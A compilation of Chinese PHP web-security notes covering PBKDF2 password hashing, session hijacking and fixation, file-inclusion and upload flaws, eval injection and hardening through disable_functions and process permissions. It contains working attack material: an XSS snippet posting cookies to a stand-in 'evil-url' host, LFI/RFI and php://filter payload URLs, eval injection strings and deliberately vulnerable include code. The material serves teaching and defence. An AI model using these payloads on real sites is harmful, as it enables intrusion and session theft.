            return SlowEquals(hash, testHash);
        }

        /// <summary>
        /// Compares two byte arrays in length-constant time. This comparison
        /// method is used so that password hashes cannot be extracted from
        /// on-line systems using a timing attack and then attacked off-line.
        /// </summary>
        /// <param name="a">The first byte array.</param>
        /// <param name="b">The second byte array.</param>
        /// <returns>True if both byte arrays are equal. False otherwise.</returns>
        private static bool SlowEquals(byte[] a, byte[] b)
        {
            uint diff = (uint)a.Length ^ (uint)b.Length;
            for (int i = 0; i < a.Length && i < b.Length; i++)
                diff |= (uint)(a[i] ^ b[i]);
            return diff == 0;
        }

        /// <summary>
        /// Computes the PBKDF2-SHA1 hash of a password.
        /// </summary>
        /// <param name="password">The password to hash.</param>
        /// <param name="salt">The salt.</param>
        /// <param name="iterations">The PBKDF2 iteration count.</param>
        /// <param name="outputBytes">The length of the hash to generate, in bytes.</param>
        /// <returns>A hash of the password.</returns>
        private static byte[] PBKDF2(string password, byte[] salt, int iterations, int outputBytes)
        {
            Rfc2898DeriveBytes pbkdf2 = new Rfc2898DeriveBytes(password, salt);
            pbkdf2.IterationCount = iterations;
            return pbkdf2.GetBytes(outputBytes);
        }
    }
}
Ruby (on Rails) 密码hash代码
代码下载

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
# Password Hashing With PBKDF2 (http://crackstation.net/hashing-security.htm).
# Copyright (c) 2013, Taylor Hornby
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without 
# modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, 
# this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation 
# and/or other materials provided with the distribution.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE 
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF 
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS 
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN 
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
# POSSIBILITY OF SUCH DAMAGE.
 
require 'securerandom'
require 'openssl'
require 'base64'
 
# Salted password hashing with PBKDF2-SHA1.
# Authors: @RedragonX (dicesoft.net), havoc AT defuse.ca 
# www: http://crackstation.net/hashing-security.htm
module PasswordHash
 
  # The following constants can be changed without breaking existing hashes.
  PBKDF2_ITERATIONS = 1000
  SALT_BYTE_SIZE = 24
  HASH_BYTE_SIZE = 24
 
  HASH_SECTIONS = 4
  SECTION_DELIMITER = ':'
  ITERATIONS_INDEX = 1
  SALT_INDEX = 2
  HASH_INDEX = 3
 
  # Returns a salted PBKDF2 hash of the password.
  def self.createHash( password )
    salt = SecureRandom.base64( SALT_BYTE_SIZE )
    pbkdf2 = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      salt,
      PBKDF2_ITERATIONS,
      HASH_BYTE_SIZE
    )
    return ["sha1", PBKDF2_ITERATIONS, salt, Base64.encode64( pbkdf2 )].join( SECTION_DELIMITER )
  end
 
  # Checks if a password is correct given a hash of the correct one.
  # correctHash must be a hash string generated with createHash.
  def self.validatePassword( password, correctHash )
    params = correctHash.split( SECTION_DELIMITER )
    return false if params.length != HASH_SECTIONS
 
    pbkdf2 = Base64.decode64( params[HASH_INDEX] )
    testHash = OpenSSL::PKCS5::pbkdf2_hmac_sha1(
      password,
      params[SALT_INDEX],
      params[ITERATIONS_INDEX].to_i,
      pbkdf2.length
    )
 
    return pbkdf2 == testHash
  end
 
  # Run tests to ensure the module is functioning properly.
  # Returns true if all tests succeed, false if not.
  def self.runSelfTests
    puts "Sample hashes:"
    3.times { puts createHash("password") }
 
    puts "\nRunning self tests..."
    @@allPass = true
 
    correctPassword = 'aaaaaaaaaa'
    wrongPassword = 'aaaaaaaaab'
    hash = createHash(correctPassword)
 
    assert( validatePassword( correctPassword, hash ) == true, "correct password" )
    assert( validatePassword( wrongPassword, hash ) == false, "wrong password" )
 
    h1 = hash.split( SECTION_DELIMITER )
    h2 = createHash( correctPassword ).split( SECTION_DELIMITER )
    assert( h1[HASH_INDEX] != h2[HASH_INDEX], "different hashes" )
    assert( h1[SALT_INDEX] != h2[SALT_INDEX], "different salt" )
 
    if @@allPass
      puts "*** ALL TESTS PASS ***"
    else
      puts "*** FAILURES ***"
    end
 
    return @@allPass
  end
 
  def self.assert( truth, msg )
    if truth
      puts "PASS [#{msg}]"
    else
      puts "FAIL [#{msg}]"
      @@allPass = false
    end
  end
 
end
 
PasswordHash.runSelfTests
```

### 验证码 Session 问题
```
php验证码类 session问题
原创2016-06-23 14:23:240163
widht = $widht; $this->height = $height; $this->codenum = $codenum; } function showcode() { $this->createcode();//创建画布 $this->createstring();//创建字符串 $this->createimage();//生成图像 } private function createcode()//创建画布 { $this->image = imagecreate($this->widht,$this->height); $backcolor = imagecolorallocate($this->image,255,255,255);//如需改变背景色请设置这里的RGB imagefill($this->image,0,0,$backcolor); if($this->bg == true) { $bg = imagecolorallocate($this->image,221,221,221); for($i = 0; $i < $this->widht / 2;$i++)//画竖线底纹 { imageline($this->image,$i*2,0,$i*2,$this->height,$bg); } for($i = 0;$i < $this->height / 3;$i++)//画横向底纹 { imageline($this->image,0,$i*3,$this->widht,$i*3,$bg); } } } private function createstring()//在画布写入字符串 { $string = $this->codestring(); session_start(); $_SESSION["vericode"] = $string; for($i = 0;$i < $this->codenum;$i++) { if($this->randttf == true) { $ttf = 'ttfs/t'.rand(1,9).'.ttf';//随机字体 请保证 ttfs文件夹 在同一目录里中，如改变路径请改变此路径 }else { $ttf = 'ttfs/t1.ttf';//9中字体请自己常识，只需要修改t4中数字 1 - 9看看到每种字体的效果，选择自己喜欢的 注：请关掉随机字体测试 } $fontsize = rand(14,15);//产生随机字体大小 $fontangle = rand(-10,10);//字符倾斜角度 随即倾斜 $x = $i*12+4; $y =rand($fontsize,$this->height-8); if($this->randcolor == true) { $textcolor = imagecolorallocate($this->image,rand(0,180),rand(0,180),rand(0,180)); }else { $textcolor = imagecolorallocate($this->image,0,0,0); } imagettftext($this->image,$fontsize,$fontangle,$x,$y,$textcolor,$ttf,$string[$i]); } } private function codestring()//生成随机字符串 { $string = ''; for($i=0;$i < $this->codenum;$i++) { $num = rand(1,1); /* * 如果想是单一的格式,请参考： * * 只要需要数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(2,2) * * 只需要小写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,3) * * 只需要大写字母 * * 把上边的 $num = rand(1,3) 改成 $num = rand(1,1) * * 只需要 小写字母 和 数字 * * 把上边的 $num = rand(1,3) 改成 $num = rand(3,2) * */ switch($num) { case 1: $num2 = rand(65,90); //随机产生小写字母 a - z 所对应的ASCII码的值 break; case 2: $num2 = rand(51,57); //随机产生数字 2 9 所对应的ASCII码的值 如果是rand(48,57):0-9将有0 这样不利于用户判断 break; case 3: $num2 = rand(97,122); //随机产生大写字母 A - Z 所对应的ASCII码的值 break; } /* *为用用户着想去除了 0 o I i 1 z Z 2 * */ if($num2 == 111 || $num == 105 || $num == 122 || $num2 == 79 || $num2 == 73 || $num == 90)//如果是大写字母中的O,I用P代替 { $num2 = 112; } $tmp = sprintf("%c",$num2); //用sprintf函数来得到产生ASCII码所对应的字符 $string .=$tmp; } return $string; } private function createimage()//生成图像 { if(function_exists("imagegif")) { header("Content-type:image/gif"); imagegif($this->image); }elseif(function_exists("imagejpeg")) { header("Content-type:image/jpeg"); imagejpeg($this->image,"",50);//50为图像的品质，0-100 0质量最差，图像文件越小 100质量最好，图像文件越大 }elseif(function_exists("imagepng")) { header("Content-type:image/png"); imagepng($this->image); }elseif(function_exists("imagewbmp")) { header("Content-type:image/vnd.wap.wbmp"); imagewbmp($this->image); }else { die('服务器不支持图像，请检查GD库'); } } function __destruct() { imagedestroy($this->image); } }?>

上边的是验证码类

下边是用来测试页面

showcode(); if(strtoupper($_GET["code"]) != $_SESSION["vericode"] ) { echo '验证码输入错误'; }else { echo '验证码正确'; }?>

我在类中已经讲 验证码字符串赋值给了 $_SESSION['vericode'] 但是我在页面测试的时候获取不到 打印session数组也无结果 求解

回复讨论(解决方案)
太长了, 没看.

请问, 表单页面和验证码页面是否处于不同二级域名下?

你下面那段测试代码的逻辑有问题

PHP code


/*
*类名：验证码类
*功能：通过该类的对象可以获取验证码图片，和验证码字符集($_SESSION['vericode'])
*作者：小A、
*时间：2012-7-3
*/
final class VeriCode
{
private $width;……

没有二级域名， 我大概说下，我是在 验证码类中直接赋值给$_SESSION的，但是在其他页面的我得不到我在类里边赋值的SESSION

太长了, 没看.

请问, 表单页面和验证码页面是否处于不同二级域名下?
没有二级域名， 我大概说下，我是在 验证码类中直接赋值给$_SESSION的，但是在其他页面的我得不到我在类里边赋值的SESSION

其他页面 session_start(); 了吗？

没初始化类的缘故吧
function __construct($widht=60,$height=30,$codenum=4)

session_start();

php简单验证码类（字母+数字）
http://3aj.cn/php/27.html

https://www.php.cn/php-weizijiaocheng-264588.html
```

### 安全的 Session ID （让即使拦截后，也无法模拟使用）
```
https://zhuanlan.zhihu.com/p/95276068
一、概述
对于Web应用程序来说，加强安全性的第一条原则就是——不要信任来自客户端的数据，一定要进行数据验证以及过滤才能在程序中使用，进而保存到数据层。然而，由于Http的无状态性，为了维持来自同一个用户的不同请求之间的状态，客户端必须发送一个唯一的身份标识符（Session ID）来表明自己的身份。很显然，这与前面提到的安全原则是相违背的，但是没有办法，为了维持状态，我们别无选择，这也导致了Session在web应用程序中是十分脆弱的一个环节。

由于PHP内置的Session管理机制并没有提供安全处理，所以，开发人员需要建立相应的安全机制来防范会话攻击。针对Session的攻击手段主要有会话劫持（Session hijacking）和会话固定（Session fixation）两种。



二、会话劫持（Session hijacking）
会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。

攻击步骤：
目标用户需要先登录站点；
登录成功后，该用户会得到站点提供的一个会话标识SessionID；
攻击者通过某种攻击手段捕获Session ID；
攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。

攻击者获取SessionID的方式有多种：
暴力破解：尝试各种Session ID，直到破解为止；
预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；
窃取：使用网络嗅探，XSS攻击等方法获得。
PHP内部Session的实现机制虽然不是很安全，但是关于生成SessionID的环节还是比较安全的，这个随机的SessionID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。

在第三种攻击方式中，针对网络嗅探攻击，是通过捕获网络通信数据得到SessionID的，这种攻击可以通过SSL避免。本文主要分析的是应用层面的攻击方式及其防御方法。

目前有三种广泛使用的在Web环境中维护会话（传递SessionID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。

使用Cookie而产生的一个风险是用户的Cookie会被攻击者所盗窃。如果Session ID保存在Cookie中，Cookie的暴露就是一个严重的风险，因为它能导致会话劫持。

最基本的Cookie窃取方式：XSS漏洞。

一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的JS脚本获取Cookie，进而通过异步请求把存有Session ID的Cookie上报给攻击者。

var img = document.createElement('img');
img.src = 'http://evil-url?c=' +encodeURIComponent(document.cookie);
document.getElementsByTagName('body')[0].appendChild(img);
如何寻找XSS漏洞是另外一个话题了，这里不详细讨论。防御上可以设置Cookie的HttpOnly属性，一旦一个Cookie被设置为HttpOnly，JS脚本就无法再获取到，而网络传输时依然会带上，也就是说依然可以依靠这个Cookie进行Session维持，但客户端JS对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。但是上面说的是无法利用XSS进行简单的攻击，但是也不是没有办法的。既然无法使用document.cookie获取到，可以转而通过其他的方式。

下面介绍一种XSS结合其他漏洞的攻击方式。
利用PHP开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括Cookie信息。

如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后Parse出Cookie信息，然后上传给攻击者。phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。防御上是关闭所有phpinfo类dump request信息的页面。

防御方法：
更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。
关闭透明化SessionID。透明化SessionID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。
设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。
关闭所有phpinfo类dump request信息的页面。
使用User-Agent检测请求的一致性。但有专家警告不要依赖于检查User-Agent的一致性。这是因为服务器群集中的HTTP代理服务器会对User-Agent进行编辑，而本群集中的多个代理服务器在编辑该值时可能会不一致。

加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。

三、 会话固定（Session fixation）

会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。

攻击步骤：
攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；
目标用户携带攻击者设定的Session ID登录站点；
攻击者通过Session ID获得合法会话。

攻击者重置SessionID的方式：
重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击。

使用Cookie来存放SessionID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。1、使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。

2、 使用HTML的<META>标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加<META>标签来设置Cookie。例如<meta http-equiv=Set-Cookiecontent=”sessionid=123”>，与客户端脚本相比，对<META>标签的处理目前还不能被浏览器禁止。

3、使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。如会话收养，闯入目标服务器所在域的任一主机，或者是攻击用户的DNS服务器。

这里还有一点需要注意，攻击者如果持有的是有效的SessionID，那么防御措施就一定得校验验证。如攻击者可以先到目标站点登录，获得有效的Session ID，然后再拿这个Session ID去重置目标用户的会话标识，那么这时候用户将会在不知情的情况下访问攻击者设定的合法会话（实际上登录的是攻击者的账号了）中，从而攻击者将有可能获取到目标用户的敏感信息。

防御方法：
用户登录时生成新的SessionID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。
大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。
```

### 目录权限安全
```
https://www.cnblogs.com/ghjbk/p/6757749.html
1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini

[HOST=域名]
open_basedir=限制目录:/tmp:/proc

这种方式更简便.

1.为每个主机配置增加一个 fastcgi_param  PHP_VALUE  "open_basedir=$document_root:/tmp/";  或是直接把这句话放到fastcgi.conf中.写在第一行或是最后一行都可以. 可以防止跨域攻击2.或是更管用的办法. 直接 打开php.ini

[HOST=域名]
open_basedir=限制目录:/tmp:/proc

这种方式更简便.
https://segmentfault.com/a/1190000018373387
```
### 包含本地与远程文件
```
https://blog.51cto.com/tdcqvip/1958654
文件包含漏洞介绍：



  程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。





漏洞成因：



  文件包含漏洞的产生原因是在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包 含漏洞。





漏洞危害：



    执行恶意代码、包含恶意文件控制网站、甚至控制网站服务器等。



本地包含漏洞：



代码：

<?PHP

$file=@$_GET['name'];

if($file){
	include $file;
}

?>
    

以以上这个代码为例：



访问：http://127.0.0.1/fileupload/include.php?name=1.txt



txt文件代码为：

<?php

phpinfo();

?>


我们可以看到txt文件里的内容以php文件的方式执行了；如下图所示：

wKiom1mdGyWDvKAjAAB9cHenV-0609.png





再看，如果访问：http://127.0.0.1/fileupload/include.php?name=2.jpg

2.jpg是一个图片的一句话木马；

wKioL1mdHS6hluOdAAASw4-kQdQ070.png-wh_50



用菜刀可以直接连接，也就是说不管后缀是什么样，最后都会以php的形式执行。



但是有时候会这样，这个在ISCC国赛中遇到了，就是在最后会自动加入.php,非常烦人。



代码2：

<?php
    Include  $_GET['page'].".php"
?>


执行结果如下图：

wKioL1mdJBmBc5u6AABo5WvNZ28269.png-wh_50



如果访问：http://127.0.0.1/fileupload/include2.php?page=1.txt



还是报错。



wKiom1mdJYCDlsCEAABQC659A7c814.png-wh_50

解决办法：%00截断

利用环境：php版本<5.3magic_quotes_gpc取消的（magic_quotes_gpc = off）





访问：http://127.0.0.1/fileupload/include2.php?page=1.txt%00



wKioL1mdJcXzg_hBAAB0G2GPapw630.png





远程包含：



  远程的文件名不能为php可解析的扩展名(php、php5..)，而且php.ini中allow_url_fopen和allow_url_include为On才可以。





访问：http://127.0.0.1/fileupload/include.php?name=http://127.0.0.1/1.txt



wKioL1mdJtnjcJOkAACPnjdVwdM034.png-wh_50







如果是遇到这种情况：

wKiom1mdJz-R4oI_AABJe51vBaA471.png可以用“？”或者“%00”阶段；

http://127.0.0.1/fileupload/include2.php?page=http://127.0.0.1/1.txt?





读取源码：php://filter/read=convert.base64-encode/resource=1.txt



http://127.0.0.1/fileupload/include.php?name=php://filter/read=convert.base64-encode/resource=1.txt



读取出来的是base64编码的，进行解码就行了。

wKiom1mdKCvBXXhkAAAezxXZmDI531.png-wh_50



php://input的用法

php://input
1.png



伪协议绕过大小写：

<?php
    
    if(isset($_GET['f'])){
        if(strpos($_GET['f'],"php") !== False){
            die("error...");
        }
        else{
            include($_GET['f'] . '.php');
        }
    }
    
?>
http://127.0.0.1//index.php?f=pHP://filter/read=convert.base64-encode/resource=index



readfile读取文件，不可以getshell

<?php
	
	 @readfile($_GET["file"]);
?>
总结：这些在iscc的国赛赛中出现过，如果当时会阶段或者会读取源码，也就能获奖了，学无止境，加油吧。

```

### 文件上传 PHP 脚本
```
https://www.php.cn/php-weizijiaocheng-342688.html
漏洞细节:
这个漏洞存在于php中一个非常常用的函数中：move_uploaded_files，开发者总是用这个函数来移动 上传 的文件,这个函数会检查被上传的文件是否是一个合法的文件(是否是通过 HTTP 的 post 机制上传的)，如果是合法的文件，则将它一定到指定目录中。

例子：

move_uploaded_file ( string $filename , string $destination )这里的问题是，可以在文件名中插入空字符(之前多次修复过这个漏洞，比如CVE-2006-7243) ，利用插入空字符的方式，攻击者可以上传任意文件，引起远程代码执行漏洞等。

我这里用DVWA来演示这个例子，DVWA级别最高的一题中因为种种原因不是很容易通过，意在告诉开发者如何去开发更 安全 的文件上传组件。让我们来看看这个例子：

代码片段：

$uploaded_name = $_FILES['uploaded']['name'];
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); $uploaded_size = $_FILES['uploaded']['size'];
if (($uploaded_ext == "jpg" || $uploaded_ext == "JPG" || $uploaded_ext == "jpeg" || $uploaded_ext == "JPEG") && ($uploaded_size < 100000)){ if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
$html .= '';
$html .= 'Your image was not uploaded.';
$html .= ''; }
else {
$html .= $target_path . ' succesfully uploaded!';
.
.

这段代码有好多个漏洞，比如XSCH, XSS等，但是没有RCE这种严重的漏洞，因为从PHP 5.3.1开始，空字符的问题已经被修复了。这里的问题是，DVWA将用户上传的name参数传递给了move_upload_file()函数，那么 php 执行的操作可能就是这样子的：

move_uploaded_file($_FILES[‘name’][‘tmp_name’],”/file.php\x00.jpg”);这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php。

这样，就绕过了代码中对后缀名的校验，并且事实证明GD库中又很多其他函数也存在这个问题(比如getimagesize(), imagecreatefromjpeg()…等)，可以看这个例子。

如果你机器的php版本在 5.4.39, 5.5.x – 5.5.23, 或者 5.6.x – 5.6.7，可以通过检查文件名中是否有\x00字符来解决本文中所述的问题。

安全建议如果你的机器上存在这个漏洞，建议使用随机字符串重命名文件名，而不是使用用户上传上来的name参数的值。

```
### `eval` 函数执行脚本
```
https://www.jb51.net/hack/122114.html
前段时间一个程序出的问题。就和这差不多。



复制代码代码如下:

<?php
$code="${${eval($_GET[c])}}";
?>
对于上面的代码。如果在URL提交http://www.phpeval.cn/test.php?c=phpinfo(); 就可以发现phpinfo()被执行了。而相应的提交c=echo 11111; 发现1111也被输出了。这个代码被执行了。

(好些PHP的代码在写文件的时候。都没有注意到这一点。他们在代码中写php的文件的时候。把代码加在双引号之内。然后过滤掉双引号。认为这样就不能执行了。实际上是可以的。)
还有一些利用方式，比如：



复制代码代码如下:

<?php
$code=addslashes($_GET[c]);
eval(""$code"");
?>
提交 http://www.site.cn/test.php?c=${${phpinfo()}}; phpinfo()就被执行。如果提交
http://www.site.cn/test.php?c=${${eval($_GET[d])}};&d=phpinfo();

这样的话，d后面的代码也被执行。

解决方法：

eval函数减弱了你的应用的安全性,因为它给被求值的文本赋予了太多的权力。强烈建议不要使用eval函数。
```
### `disable_functions` 关闭高危函数
```
https://www.jb51.net/article/29750.htm
phpinfo()
功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。
危险等级：中

passthru()
功能描述：允许执行一个外部程序并回显输出，类似于 exec()。
危险等级：高

exec()
功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。
危险等级：高

system()
功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。
危险等级：高

chroot()
功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式
PHP 时才能工作，且该函数不适用于 Windows 系统。
危险等级：高

scandir()
功能描述：列出指定路径中的文件和目录。
危险等级：中

chgrp()
功能描述：改变文件或目录所属的用户组。
危险等级：高

chown()
功能描述：改变文件或目录的所有者。
危险等级：高

shell_exec()
功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。
危险等级：高

proc_open()
功能描述：执行一个命令并打开文件指针用于读取以及写入。
危险等级：高

proc_get_status()
功能描述：获取使用 proc_open() 所打开进程的信息。
危险等级：高

error_log()
功能描述：将错误信息发送到指定位置（文件）。
安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，
执行任意命令。
危险等级：低

ini_alter()
功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。
具体参见 ini_set()。
危险等级：高

ini_set()
功能描述：可用于修改、设置 PHP 环境配置参数。
危险等级：高

ini_restore()
功能描述：可用于恢复 PHP 环境配置参数到其初始值。
危险等级：高

dl()
功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。
危险等级：高

pfsockopen()
功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。
危险等级：高

syslog()
功能描述：可调用 UNIX 系统的系统层 syslog() 函数。
危险等级：中

readlink()
功能描述：返回符号连接指向的目标文件内容。
危险等级：中

symlink()
功能描述：在 UNIX 系统中建立一个符号链接。
危险等级：高

popen()
功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。
危险等级：高

stream_socket_server()
功能描述：建立一个 Internet 或 UNIX 服务器连接。
危险等级：中

putenv()
功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数
修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。
危险等级：高

禁用方法如下：
打开/etc/php.ini文件，
查找到 disable_functions ，添加需禁用的函数名，如下：
phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen
```

### FPM 独立用户与组，给每个目录特定权限
```
https://blog.csdn.net/asdfzxc123789/article/details/101782479
核心总结：php-fpm/apache 进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。

 

根据生产环境不断反馈，发现不断有 php网站被挂木马，绝大部分原因是因为权限设置不合理造成。因为服务器软件，或是 php 程序中存在漏洞都是难免的，在这种情况下，如果能正确设置 Linux 网站目录权限， php 进程权限，那么网站的安全性实际上是可以得到保障的。

 

那么，造成网站被挂木马的原因是什么？

 

1. 　ftp 连接信息被破解，对这个原因，可行的办法就是使用非常复杂的FTP 用户名（不要使用常用的用户名），如果是固定作业，可考虑使用 iptables 防火墙限制来源 IP 。但是一些情景下，可能需要使用 VPN 以便远程维护。　即网站维护者需要使用 FTP 修改网站文件时，必须先登录到 IDC 机房的 VPN 服务器上，再进行后续的操作。

 

2. 　网站服务器软件/ 配置 /php 程序存在漏洞，被利用 
在讨论这个问题前，先说明文件及进程权限的几个概念:

A.  FTP用户对网站目录具有最大修改权限，那么网站的文件所有者一定属于 FTP, 　这是毋庸置疑的 ,  否则如何修改文件呢？

B.  php-fpm/apache/nginx 进程对网站文件至少需要有读取权限，例如，以下命令即可查看这两个进程所使用的账号：







通过上图，我们可以发现，nginx 和 php-fpm 子进程账号是 nobody 。

 

我们再查看网站文件目录的权限： 


发现网站文件所有者是www 账号，那说明：

|  nginx和 php 对网站只有读取权限，无写入权限

l  如果php 程序需要对网站某些文件有写入权限，需要手工将文件或目录权限修改为 777

l  因为php-fpm 子进程是以 nobody 运行，那么 php-fpm 生成的新文件所有者也是 nobody,  这时 ftp 用户将无法修改这些文件，解铃还需系铃人，当 php 生成文件后，需要调用 chmod("/somedir/somefile", 0777) 将文件权限修改为 777 ，以便 FTP 用户也可以修改这个文件。

l  经常有开发人员找我请求重设php 生成的文件的权限。

 

l  如果php-fpm/apache/nginx进程以网站文件所有者用户运行，那意味着 php-fpm/apache/nginx 进程对整个网站目录具有可写权限，噩梦也就由此开始。

 

但是我们发现，有不少系统管理员为了省事，违背了Linux 最小化权限的原则，设置 php-fpm/apache/nginx进程以网站文件所有者账号运行，当然这样可能会方便 php 开发人员（ php-fpm 进程对整个网站目录具有可写权限），但是这样一来， Linux 体系的文件系统权限原则将被打破，所有的安全措施将形同虚设。可以想象的是，万一 php 程序中有漏洞，攻击者上传木马，便可以修改网站的所有文件，网站首页被黑，也就不足为怪了。

 

退一步，如果我们设置了较严格的权限，就算php 程序中存在漏洞，那么攻击者也只能篡改权限为 777 的目录，其它的文件是无法被改写的，网站不就就得更安全了吗？

 

核心总结：php-fpm/apache/nginx进程所使用的用户，不能是网站文件所有者。 凡是违背这个原则，则不符合最小权限原则。

 

经过我参阅网上关于nginx, php-fpm 配置的文章教程和市面上的一些书籍，发现有不少人受这些文章的误导，直接让 php-fpm/apache/nginx进程以网站所有者账号运行，例如张宴的《实战 nginx  取代 apache 的高性能 Web服务器》一书的 52 页中，存在以下设置：

<value name="user">www</value>

<value name="group">www</value>

 

